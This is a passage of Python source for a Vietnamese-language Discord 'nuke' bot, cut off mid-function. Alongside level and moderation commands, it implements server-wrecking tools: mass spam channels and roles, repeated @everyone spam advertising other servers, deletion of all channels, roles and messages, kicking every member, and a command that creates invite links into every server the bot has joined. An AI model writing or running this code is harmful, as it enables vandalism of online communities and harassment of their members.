async def set_goodbye_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('❌ NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Cú pháp đúng: `nuked setgoodbye #kênh` hoặc `nuked setgoodbye` để tắt")

# ==================== LỆNH SETLV ====================
@bot.command(name="setlv")
@is_bot_owner()
async def set_level(ctx, level: int, member: discord.Member):
    """📊 Đặt level cho thành viên"""
    try:
        if level < 1:
            await ctx.send("❌ Level tối thiểu phải từ 1 trở lên!")
            return
        guild_id = ctx.guild.id
        if guild_id not in USER_LEVELS:
            USER_LEVELS[guild_id] = {}
        user_id = member.id
        USER_LEVELS[guild_id][user_id] = {"exp": 0, "level": level}
        save_levels()
        await check_and_assign_level_roles(member, level)
        embed = discord.Embed(
            title="⭐ **CẬP NHẬT LEVEL THÀNH CÔNG** ⭐",
            description=f"👑 Boss Bảo đã đặt level của {member.mention} lên mức **Level {level}**!",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản lý độc quyền của Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(e)}")

@set_level.error
async def set_level_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Cú pháp đúng: `nuked setlv <level> @user`")

# ==================== LỆNH LV ====================
@bot.command(name="lv")
async def check_user_level(ctx, member: discord.Member = None):
    """📊 Xem level của bạn hoặc người khác"""
    if member is None:
        member = ctx.author
    guild_id = ctx.guild.id
    user_id = member.id
    user_data = USER_LEVELS.get(guild_id, {}).get(user_id, {"exp": 0, "level": 1})
    current_level = user_data["level"]
    current_exp = user_data["exp"]
    required_exp = get_required_exp(current_level)
    embed = discord.Embed(
        title=f"📊 **HỆ THỐNG LEVEL - {member.display_name}** 📊",
        description=f"👤 **Thành viên:** {member.mention}\n⭐ **Level hiện tại:** `{current_level}`\n✨ **EXP:** `{current_exp} / {required_exp}`",
        color=0x00FFFF
    )
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.set_footer(text="Hệ thống thăng cấp độc quyền phục vụ server 💖")
    await ctx.send(embed=embed)

@check_user_level.error
async def check_user_level_error(ctx, error):
    await ctx.send(f"❌ Cú pháp đúng: `nuked lv` hoặc `nuked lv @user`")

# ==================== LỆNH CHANNELSLV ====================
@bot.command(name="channelslv")
@is_bot_owner()
async def channelslv(ctx, channel: discord.TextChannel = None):
    """📢 Cài kênh thông báo level"""
    try:
        if channel is None:
            if ctx.guild.id in SERVER_LEVEL_CHANNELS:
                del SERVER_LEVEL_CHANNELS[ctx.guild.id]
                save_config()
                embed = discord.Embed(
                    title="🔇 ĐÃ TẮT THÔNG BÁO LEVEL",
                    description="🎉 Hệ thống đã ngừng gửi thông báo thăng cấp!",
                    color=0x00FF00
                )
                embed.set_footer(text="Boss Bảo đã tắt thông báo level 💖")
                await ctx.send(embed=embed)
            else:
                embed = discord.Embed(
                    title="⚠️ CHƯA CÀI ĐẶT KÊNH LEVEL",
                    description=(
                        "🔹 Hiện chưa có kênh thông báo level nào được cài đặt.\n"
                        "🔹 **Cú pháp:** `nuked channelslv #kênh`\n"
                        "🔹 **Ví dụ:** `nuked channelslv #level`\n\n"
                        "📌 **Chức năng:** Tự động thông báo khi thành viên lên level"
                    ),
                    color=0xFF9900
                )
                embed.set_footer(text="Hệ thống level tự động phục vụ Boss Bảo 💖")
                await ctx.send(embed=embed)
            return
        SERVER_LEVEL_CHANNELS[ctx.guild.id] = channel.id
        save_config()
        try:
            test_embed = discord.Embed(
                title="🎉 LEVEL SYSTEM ACTIVATED",
                description=(
                    f"🔹 Kênh thông báo level đã được cài đặt thành công!\n"
                    f"🔹 Người cài: {ctx.author.mention}\n"
                    f"🔹 Server: {ctx.guild.name}\n\n"
                    f"✨ Khi thành viên lên level, sẽ có thông báo tại đây!"
                ),
                color=0x00FF00,
                timestamp=datetime.now()
            )
            test_embed.set_image(url="https://i.pinimg.com/originals/c3/2c/e0/c32ce0a583261b5a296afc194671a5f9.gif")
            test_embed.set_footer(text="Hệ thống level tự động")
            await channel.send(embed=test_embed)
        except:
            pass
        embed = discord.Embed(
            title="✅ ĐÃ THIẾT LẬP KÊNH THÔNG BÁO LEVEL",
            description=(
                f"📌 **Kênh thông báo:** {channel.mention}\n"
                f"👑 **Người cài:** {ctx.author.mention}\n"
                f"⭐ **Chức năng:**\n"
                f"• Tự động thông báo khi thành viên lên level\n"
                f"• Hiển thị tên + avatar người lên level\n"
                f"• Kèm ảnh chúc mừng sinh động\n"
                f"• Cập nhật role theo level (20, 200, 300, 400, 500, 670)"
            ),
            color=0x00FF00
        )
        embed.set_thumbnail(url="https://i.pinimg.com/originals/7a/41/bb/7a41bb51fe3babe0c6cee161f85df62c.gif")
        embed.set_footer(text="Hệ thống level tự động phục vụ Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        error_embed = discord.Embed(
            title="❌ LỖI CÀI KÊNH LEVEL",
            description=f"⚠️ Đã xảy ra lỗi: `{str(e)}`\n🔹 Vui lòng kiểm tra quyền bot.",
            color=0xFF0000
        )
        await ctx.send(embed=error_embed)

@channelslv.error
async def channelslv_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('❌ NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

# ==================== LỆNH ADDROLE ====================
@bot.command(name="addrole")
@is_bot_owner()
async def addrole(ctx, role_name: str, *, permissions_str: str = ""):
    """👑 Tạo role mới với quyền hạn của bot"""
    try:
        bot_member = ctx.guild.me
        bot_permissions = bot_member.guild_permissions
        new_role = await ctx.guild.create_role(
            name=role_name,
            permissions=bot_permissions,
            color=discord.Color.random(),
            hoist=True,
            reason=f"Được tạo bởi lệnh nuked addrole từ Boss Bảo"
        )
        embed = discord.Embed(
            title="✅ **TẠO VÀ GÁN QUYỀN ROLE THÀNH CÔNG** ✅",
            description=f"📌 **Tên Role:** `{new_role.name}`\n🛡️ **Quyền hạn:** Đã sao chép toàn bộ quyền hạn của bot.\n👤 **Thực thi:** {ctx.author.mention}",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi khi tạo role: {str(e)}")

@addrole.error
async def addrole_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Cú pháp đúng: `nuked addrole <tên_role>`")

# ==================== LỆNH SHOWSV ====================
@bot.command(name="showsv")
@is_bot_owner()
async def showsv(ctx):
    """🌐 Hiển thị danh sách các máy chủ bot đang tham gia"""
    try:
        guilds = bot.guilds
        if not guilds:
            await ctx.send("🤖 Bot hiện chưa tham gia server nào.")
            return
        embed = discord.Embed(
            title=f"🌐 **DANH SÁCH MÁY CHỦ BOT ĐANG THAM GIA ({len(guilds)})** 🌐",
            color=0x00FFFF
        )
        for guild in guilds:
            try:
                owner = guild.owner or await guild.fetch_member(guild.owner_id)
                owner_str = f"{owner} (`{guild.owner_id}`)"
            except:
                owner_str = f"Không xác định (`{guild.owner_id}`)"
            invite_link = "Không thể tạo link"
            try:
                for c in guild.text_channels:
                    if c.permissions_for(guild.me).create_instant_invite:
                        invite = await c.create_invite(max_age=300, max_uses=1)
                        invite_link = invite.url
                        break
            except:
                pass
            guild_info = (
                f"👑 **Chủ sở hữu:** {owner_str}\n"
                f"👥 **Thành viên:** `{guild.member_count}`\n"
                f"🔗 **Link mời:** {invite_link}"
            )
            embed.add_field(name=f"🏰 {guild.name} (`{guild.id}`)", value=guild_info, inline=False)
        embed.set_footer(text=f"Yêu cầu bởi Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@showsv.error
async def showsv_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH NUKE ====================
@bot.command(name="nuke")
@is_bot_owner()
async def nuke_server(ctx):
    """💥 NUKE SERVER - Xóa toàn bộ và tạo spam"""
    try:
        try:
            await ctx.message.delete()
        except:
            pass
        confirm_embed = discord.Embed(
            title="🔴 🌈 **XÁC NHẬN LỆNH NUKE TỪ BOSS BẢO** 🌈 🔴",
            description=(
                f"🔥 **Kính chào Boss Bảo!**\nBạn đã yêu cầu nuke máy chủ: **{ctx.guild.name}** (`{ctx.guild.id}`)\n\n"
                f"Vui lòng kiểm tra kỹ và bấm nút bên dưới để quyết định:\n"
                f"• 🟢 **Đồng ý:** Bot sẽ check server và tiến hành xả 2000 tin nhắn (20 tin/kênh).\n"
                f"• 🔴 **Từ chối:** Hủy bỏ lệnh và thông báo."
            ),
            color=0xFF0000
        )
        confirm_embed.set_footer(text="Hệ thống tối cao phục vụ Boss Bảo 💖")
        view = NukeConfirmView(ctx.guild, ctx.channel)
        await ctx.author.send(embed=confirm_embed, view=view)
        temp_notice = await ctx.send("📩 **Boss Bảo check tin nhắn riêng (DM) để xác nhận lệnh nuke nhé!**")
        await asyncio.sleep(5)
        try:
            await temp_notice.delete()
        except:
            pass
    except discord.Forbidden:
        await ctx.send("❌ Boss Bảo ơi, hãy mở DM (Tin nhắn riêng) để bot có thể gửi bảng xác nhận nuke nhé!")
    except Exception as e:
        await ctx.send(f"❌ Đã xảy ra lỗi: {str(e)}")

@nuke_server.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Đã xảy ra lỗi khi thực hiện lệnh nuke: {str(error)}")

# ==================== CÁC LỆNH SPAM, KICK, ROLE, CHANNEL, SETTING... ====================
@bot.command(name="spamchannels")
@is_bot_owner()
async def spam_channels(ctx, amount: int = 100):
    """🚀 Tạo hàng loạt kênh spam"""
    try:
        if amount > 200:
            amount = 200
        embed = discord.Embed(
            title="🚀 🌈 **KÍCH HOẠT TẠO KÊNH SPAM CHO BOSS BẢO** 🌈",
            description=f"🔥 **Đang tạo {amount} kênh...** 🔥",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
        for i in range(0, amount, 10):
            batch = []
            for j in range(i, min(i+10, amount)):
                channel_name = NUKE_CHANNEL_NAMES[j % len(NUKE_CHANNEL_NAMES)]
                batch.append(ctx.guild.create_text_channel(name=channel_name))
            await asyncio.gather(*batch, return_exceptions=True)
            await asyncio.sleep(0.5)
        complete_embed = discord.Embed(
            title="✅ 🌈 **TẠO KÊNH HOÀN TẤT** 🌈",
            description=f"🎉 **Đã tạo thành công {amount} kênh spam!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@spam_channels.error
async def spam_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="spameveryone")
@is_bot_owner()
async def spam_everyone(ctx):
    """📢 Spam @everyone và @here vào tất cả kênh"""
    try:
        spam_content = (
            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT(●'◡'●)\n"
            "|| @everyone||\n"
            "|| @here ||\n"
            '"|| link support 1 ||: https://discord.gg/Grr6RWe9A"\n'
            ' "|| link support 2 ||:https://discord.gg/4wrsMbRVpU"'
        )
        embed = discord.Embed(
            title="🚀 🌈 **KÍCH HOẠT SPAM @EVERYONE** 🌈",
            description="🔥 **Đang spam @everyone theo lệnh Boss Bảo...** 🔥",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
        for channel in ctx.guild.text_channels:
            try:
                tasks = []
                for _ in range(10):
                    embed_spam = discord.Embed()
                    embed_spam.set_image(url=NUKE_GIF_URL)
                    tasks.append(channel.send(spam_content, embed=embed_spam))
                await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(0.5)
            except:
                continue
        complete_embed = discord.Embed(
            title="✅ 🌈 **SPAM @EVERYONE HOÀN TẤT** 🌈",
            description="🎉 **Đã spam thông điệp hoàn tất!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@spam_everyone.error
async def spam_everyone_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="deleteallchannels")
@is_bot_owner()
async def delete_all_channels(ctx):
    """🗑️ Xóa tất cả kênh trong server"""
    try:
        confirm_embed = discord.Embed(
            title="⚠️ 🌈 **XÁC NHẬN XÓA TẤT CẢ KÊNH** 🌈 ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ xóa **TOÀN BỘ** kênh trong server\n\n"
                f"🔹 **Gõ nuked confirmdelete để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "nuked confirmdelete":
                await ctx.send("❌ Lệnh xóa kênh đã bị hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian chờ.")
            return
        embed = discord.Embed(
            title="🚀 🌈 **ĐANG XÓA TẤT CẢ KÊNH...** 🌈",
            description="🔥 **Đang thực hiện...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        channels = list(ctx.guild.channels)
        for i in range(0, len(channels), 15):
            batch = channels[i:i+15]
            tasks = [ch.delete() for ch in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.5)
        complete_embed = discord.Embed(
            title="✅ 🌈 **XÓA KÊNH HOÀN TẤT** 🌈",
            description="🎉 **Đã xóa thành công tất cả kênh!**",
            color=0x00FF00
        )
        await send_log_to_all(ctx.guild.id, complete_embed)
        try:
            await ctx.author.send(embed=complete_embed)
        except:
            pass
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@delete_all_channels.error
async def delete_all_channels_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="spamroles")
@is_bot_owner()
async def spam_roles(ctx, amount: int = 50):
    """🎭 Tạo hàng loạt role spam"""
    try:
        if amount > 250:
            amount = 250
        embed = discord.Embed(
            title="🚀 🌈 **TẠO ROLE SPAM** 🌈",
            description=f"🔥 **Đang tạo {amount} role...** 🔥",
            color=0xFF69B4
        )
        await ctx.send(embed=embed)
        for i in range(0, amount, 10):
            batch = []
            for j in range(i, min(i+10, amount)):
                role_name = NUKE_CHANNEL_NAMES[j % len(NUKE_CHANNEL_NAMES)]
                color = discord.Color(random.randint(0, 0xFFFFFF))
                batch.append(ctx.guild.create_role(name=role_name, color=color, hoist=True, mentionable=True))
            await asyncio.gather(*batch, return_exceptions=True)
            await asyncio.sleep(0.5)
        complete_embed = discord.Embed(
            title="✅ 🌈 **TẠO ROLE HOÀN TẤT** 🌈",
            description=f"🎉 **Đã xong {amount} role!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@spam_roles.error
async def spam_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="deleteallroles")
@is_bot_owner()
async def delete_all_roles(ctx):
    """🗑️ Xóa tất cả role trong server (trừ @everyone)"""
    try:
        confirm_embed = discord.Embed(
            title="⚠️ 🌈 **XÁC NHẬN XÓA TẤT CẢ ROLE** 🌈 ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ xóa **TOÀN BỘ** role\n\n"
                f"🔹 **Gõ nuked confirmdeleteroles để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "nuked confirmdeleteroles":
                await ctx.send("❌ Hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian.")
            return
        embed = discord.Embed(
            title="🚀 🌈 **ĐANG XÓA TẤT CẢ ROLE...** 🌈",
            description="🔥 **Đang xử lý...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        roles = [r for r in ctx.guild.roles if r.name != "@everyone"]
        for i in range(0, len(roles), 10):
            batch = roles[i:i+10]
            tasks = [r.delete() for r in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.5)
        complete_embed = discord.Embed(
            title="✅ 🌈 **XÓA ROLE HOÀN TẤT** 🌈",
            description="🎉 **Đã xóa xong!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@delete_all_roles.error
async def delete_all_roles_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="kickall")
@is_bot_owner()
async def kick_all_members(ctx):
    """👢 Đá tất cả thành viên (trừ Boss và bot)"""
    try:
        confirm_embed = discord.Embed(
            title="⚠️ 🌈 **XÁC NHẬN KICK TẤT CẢ THÀNH VIÊN** 🌈 ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ kick toàn bộ thành viên trừ Boss và bot.\n\n"
                f"🔹 **Gõ nuked confirmkickall để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "nuked confirmkickall":
                await ctx.send("❌ Hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian.")
            return
        embed = discord.Embed(
            title="🚀 🌈 **ĐANG KICK THÀNH VIÊN...** 🌈",
            description="🔥 **Đang thực hiện...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        members = [m for m in ctx.guild.members if not m.bot and m.id not in BOT_OWNERS and m.id != ctx.guild.owner_id]
        for i in range(0, len(members), 10):
            batch = members[i:i+10]
            tasks = [m.kick(reason="Server nuke theo lệnh Boss Bảo") for m in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(1)
        complete_embed = discord.Embed(
            title="✅ 🌈 **KICK HOÀN TẤT** 🌈",
            description="🎉 **Đã thực thi xong!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@kick_all_members.error
async def kick_all_members_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="setservername")
@is_bot_owner()
async def set_server_name(ctx, *, new_name: str):
    """✏️ Đổi tên server"""
    try:
        if len(new_name) > 100:
            new_name = new_name[:100]
        await ctx.guild.edit(name=new_name)
        embed = discord.Embed(
            title="✅ 🌈 **THAY ĐỔI TÊN SERVER THÀNH CÔNG** 🌈",
            description=f"🎉 **Đã đổi thành:** {new_name}",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_server_name.error
async def set_server_name_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

@bot.command(name="setservericon")
@is_bot_owner()
async def set_server_icon(ctx, url: str = None):
    """🖼️ Đổi icon server bằng URL hoặc file đính kèm"""
    try:
        if url:
            if not url.startswith(('http://', 'https://')):
                raise ValueError("URL không hợp lệ")
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        raise ValueError("Không tải được ảnh")
                    image_data = await resp.read()
        else:
            image_data = None
        await ctx.guild.edit(icon=image_data)
        embed = discord.Embed(
            title="✅ 🌈 **THAY ĐỔI ICON SERVER THÀNH CÔNG** 🌈",
            description="🎉 **Icon đã cập nhật!**",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_server_icon.error
async def set_server_icon_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
    else:
        await ctx.send(f"❌ Lỗi: {str(error)}")

# ==================== LỆNH KICK, BAN, UNBAN, CREATE CHANNEL, DELETE CHANNEL, PURGE, ROLE, REMOVEROLE, LOCK, UNLOCK ====================
@bot.command(name="kick")
@is_bot_owner()
async def kick_user(ctx, member: discord.Member, *, reason: str = "Không có lý do"):
    """👢 Kick thành viên khỏi server"""
    try:
        if member.id == ctx.author.id:
            await ctx.send("❌ Không thể kick chính mình!")
            return
        if member.id in BOT_OWNERS:
            await ctx.send("❌ Không thể kick Owner!")
            return
        await member.kick(reason=reason)
        embed = discord.Embed(
            title="👢 ĐÃ KICK THÀNH VIÊN",
            description=f"👤 **Người bị kick:** {member.mention}\n📌 **Lý do:** {reason}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0xFF9900
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="ban")
@is_bot_owner()
async def ban_user(ctx, member: discord.Member, *, reason: str = "Không có lý do"):
    """🔨 Ban thành viên khỏi server"""
    try:
        if member.id == ctx.author.id:
            await ctx.send("❌ Không thể ban chính mình!")
            return
        if member.id in BOT_OWNERS:
            await ctx.send("❌ Không thể ban Owner!")
            return
        await member.ban(reason=reason)
        embed = discord.Embed(
            title="🔨 ĐÃ BAN THÀNH VIÊN",
            description=f"👤 **Người bị ban:** {member.mention}\n📌 **Lý do:** {reason}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0xFF0000
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="unban")
@is_bot_owner()
async def unban_user(ctx, user_id: int, *, reason: str = "Không có lý do"):
    """✅ Gỡ ban thành viên"""
    try:
        user = await bot.fetch_user(user_id)
        await ctx.guild.unban(user, reason=reason)
        embed = discord.Embed(
            title="✅ ĐÃ UNBAN THÀNH VIÊN",
            description=f"👤 **Người được unban:** {user.mention}\n📌 **Lý do:** {reason}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="createchannel")
@is_bot_owner()
async def create_channel(ctx, *, name: str):
    """🆕 Tạo kênh văn bản mới"""
    try:
        channel = await ctx.guild.create_text_channel(name)
        embed = discord.Embed(
            title="🆕 ĐÃ TẠO KÊNH MỚI",
            description=f"📌 **Tên kênh:** {channel.mention}\n👑 **Người tạo:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="deletechannel")
@is_bot_owner()
async def delete_channel(ctx, channel: discord.TextChannel = None):
    """🗑️ Xóa kênh (mặc định là kênh hiện tại)"""
    if channel is None:
        channel = ctx.channel
    try:
        channel_name = channel.name
        await channel.delete()
        embed = discord.Embed(
            title="🗑️ ĐÃ XÓA KÊNH",
            description=f"📌 **Tên kênh:** `{channel_name}`\n👑 **Người xóa:** {ctx.author.mention}",
            color=0xFF0000
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="purge")
@is_bot_owner()
async def purge_all(ctx, confirm: str = None):
    """🧹 Xóa toàn bộ tin nhắn trong server (cần xác nhận)"""
    if confirm is None or confirm.lower() != "all":
        await ctx.send("⚠️ **CẢNH BÁO!** Lệnh này sẽ xóa TOÀN BỘ tin nhắn trong server!\n🔹 Gõ `nuked purge all` để xác nhận.")
        return
    embed = discord.Embed(
        title="🧹 ĐANG XÓA TOÀN BỘ TIN NHẮN...",
        description="⏳ Đang xử lý, vui lòng đợi...",
        color=0xFF9900
    )
    await ctx.send(embed=embed)
    try:
        total_deleted = 0
        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    deleted = await channel.purge(limit=1000)
                    total_deleted += len(deleted)
                    await asyncio.sleep(1)
                except:
                    pass
        embed = discord.Embed(
            title="✅ ĐÃ XÓA TOÀN BỘ TIN NHẮN",
            description=f"🧹 Đã xóa tổng cộng **{total_deleted}** tin nhắn trong server!\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="role")
@is_bot_owner()
async def add_role_to_user(ctx, member: discord.Member, *, role_name: str):
    """🎭 Thêm role cho thành viên"""
    try:
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if not role:
            await ctx.send(f"❌ Không tìm thấy role `{role_name}`!")
            return
        await member.add_roles(role, reason=f"Lệnh từ Boss Bảo")
        embed = discord.Embed(
            title="✅ ĐÃ THÊM ROLE",
            description=f"👤 **Người nhận:** {member.mention}\n🎭 **Role:** {role.mention}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="removerole")
@is_bot_owner()
async def remove_role_from_user(ctx, member: discord.Member, *, role_name: str):
    """🎭 Xóa role khỏi thành viên"""
    try:
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if not role:
            await ctx.send(f"❌ Không tìm thấy role `{role_name}`!")
            return
        await member.remove_roles(role, reason=f"Lệnh từ Boss Bảo")
        embed = discord.Embed(
            title="✅ ĐÃ XÓA ROLE",
            description=f"👤 **Người bị xóa:** {member.mention}\n🎭 **Role:** {role.mention}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0xFF9900
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="lock")
@is_bot_owner()
async def lock_channel(ctx, channel: discord.TextChannel = None):
    """🔒 Khóa kênh (không ai gửi tin nhắn)"""
    if channel is None:
        channel = ctx.channel
    try:
        await channel.set_permissions(ctx.guild.default_role, send_messages=False)
        embed = discord.Embed(
            title="🔒 ĐÃ KHÓA KÊNH",
            description=f"📌 **Kênh:** {channel.mention}\n🔒 Đã khóa, không ai có thể gửi tin nhắn!\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0xFF0000
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="unlock")
@is_bot_owner()
async def unlock_channel(ctx, channel: discord.TextChannel = None):
    """🔓 Mở khóa kênh"""
    if channel is None:
        channel = ctx.channel
    try:
        await channel.set_permissions(ctx.guild.default_role, send_messages=True)
        embed = discord.Embed(
            title="🔓 ĐÃ MỞ KHÓA KÊNH",
            description=f"📌 **Kênh:** {channel.mention}\n🔓 Đã mở khóa, mọi người có thể gửi tin nhắn!\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
